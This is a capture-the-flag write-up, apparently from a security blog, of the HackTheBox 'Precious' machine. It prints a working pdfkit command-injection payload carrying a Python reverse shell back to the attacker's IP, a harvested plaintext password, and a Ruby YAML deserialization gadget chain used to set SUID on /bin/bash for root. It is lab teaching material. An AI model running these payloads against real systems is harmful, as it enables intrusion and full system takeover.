@@ -1,0 +1,371 @@
+---
+title: Hackthebox Precious Writeup
+slug: hackthebox-precious-writeup
+description: Hackthebox released a new machine called precious. On this machine, first we got the web service which converts the web-page to a PDF, which is vulnerable to command injection. Using that, get the rev shell, and for privilege escalation, use code execution through yaml deserialization attack.
+date: 2022-11-27
+image: hackthebox-precious-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+❯ nmap -sC -sV -oA nmap/result 10.10.11.189
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 00:13 CST
+Nmap scan report for 10.10.11.189
+Host is up (0.084s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds
+```
+
+Nmap reveals that `80` and `22` ports are open and 80 port redirect us to `precious.htb`
+
+Let's quickly add that in `/etc/hosts` file
+
+```js
+❯ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       dedinfosec
+
+10.10.11.189    precious.htb
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+## Precious.htb
+
+There is a simple `web page convertor` which take the `URL` as input and give the `PDF` as output
+
+<FixTheImageURL src='web.png' slug='hackthebox-precious-writeup' />
+
+Let's `quickly` spin up the `python3` web server
+
+```js
+❯ python3 -m http.server 80
+```
+
+Input the `IP` of our `attacker` machine
+
+<FixTheImageURL src='web1.png' slug='hackthebox-precious-writeup' />
+
+And it's `converted` the webpage into `PDF` as expected, let's download the PDF
+
+<FixTheImageURL src='web2.png' slug='hackthebox-precious-writeup' />
+
+Analyzing the PDF, we're going to known that it's using `pdfkit v0.8.6`.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-precious-writeup' />
+
+## CVE-2022-25765
+
+Searching that on `Google` I find a command `injection vulnerability`
+
+<FixTheImageURL src='web3.png' slug='hackthebox-precious-writeup' />
+
+Link : https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+
+<Tweet id='1578667943852118017' />
+
+After reading the `POC` I got to known that we can use any get `parameter` name and inside that use the `backticks` to injection our command.
+
+```js
+http://10.10.XX.XX/?name=%20`id`
+```
+
+Let's `input` that and check any changes in the `output`
+
+<FixTheImageURL src='web4.png' slug='hackthebox-precious-writeup' />
+
+And as per the command `id` we got the `user info`
+
+<FixTheImageURL src='web5.png' slug='hackthebox-precious-writeup' />
+
+Let's use the `python3` payload to get the `rev` shell
+
+```python
+http://10.10.XX.XX/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+```
+
+And we got the rev shell as `ruby` user
+
+```js
+❯ nc -nvlp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.11.189.
+Ncat: Connection from 10.10.11.189:42830.
+$ ls
+ls
+app  config  config.ru  Gemfile  Gemfile.lock  pdf  public
+$ cd /home/ruby
+cd /home/ruby
+$ ls -al
+ls -al
+total 28
+drwxr-xr-x 4 ruby ruby 4096 Nov 26 14:36 .
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+drwxr-xr-x 4 ruby ruby 4096 Nov 26 19:56 .cache
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
+```
+
+## Ruby To Henry User
+
+In the `ruby` user directory, I found a folder called `.bundle` which has the `henry` user password in it.
+
+```js {23}
+$ ls -al
+ls -al
+total 28
+drwxr-xr-x 4 ruby ruby 4096 Nov 26 14:36 .
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+drwxr-xr-x 4 ruby ruby 4096 Nov 26 19:56 .cache
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
+$ cd .bundle
+cd .bundle
+$ ls -al
+ls -al
+total 12
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
+drwxr-xr-x 4 ruby ruby 4096 Nov 26 14:36 ..
+-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config
+$ cat config
+cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+```
+
+Login with `henry` user.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-precious-writeup' />
+
+## Privilege Escalation
+
+Before running `linPeas` I like to check `manually`
+
+Running the `sudo -l` command, get a `update_dependencies.rb` file which we can run as `root` user
+
+```js
+-bash-5.1$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+Checking the file, we're going to known that it's using `YAML.load` which is vulnerable to `YAML Deserialization Attack`.
+
+<ConsCard
+    title="Don't use YAML.load()"
+    cons={['YAML.load() was most likely the culprit with this finding.']}
+/>
+
+<ProsCard
+    title='Instead use YAML.safe_load()'
+    pros={[
+        'If you are familiar with pickle, you will know that load() is also a highly strong function. Both techniques are extremely unsafe since they let an attacker run the arbitrary code',
+        'safe_load() just contains a portion of the load function, it should be used if you’re processing the ordinary YAML files',
+    ]}
+/>
+
+```ruby {11}:update_dependencies.rb
+henry@precious:~$ cat /opt/update_dependencies.rb
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+
+Link : https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
+
+Link : https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
+
+Now we can `exploit` that with our malicious `dependencies.yml` file
+
+```js:dependencies.yml {18}
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+
+I write the `dependencies.yml` file inside `henry` folder
+
+Now let's `run` the command
+
+```js {27}
+henry@precious:~$ pwd
+/home/henry
+henry@precious:~$ ls
+dependencies.yml  user.txt
+henry@precious:~$ cat dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+And we got the `command injection`
+
+Let's change the `command` to set the permission of `/bin/bash` binary to SUID bit set.
+
+```js:dependencies.yml {18}
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "chmod +s /bin/bash"
+         method_id: :resolve
+```
+
+It's works, the `/bin/bash` binary has now the `SUID` permission
+
+```js {39}
+henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `<main>'
+        32: from /opt/update_dependencies.rb:10:in `list_from_file'
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+henry@precious:~$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+```
+
+And we got the `root.txt` and `user.txt` files.
+
+```js
+henry@precious:~$ /bin/bash -p
+bash-5.1# cd /root
+bash-5.1# cat root.txt; cat /home/henry/user.txt
+3e65f5f15a60993e469cec52af3141c7
+56c36a10c17db0478af95c8e10f8f733
+```
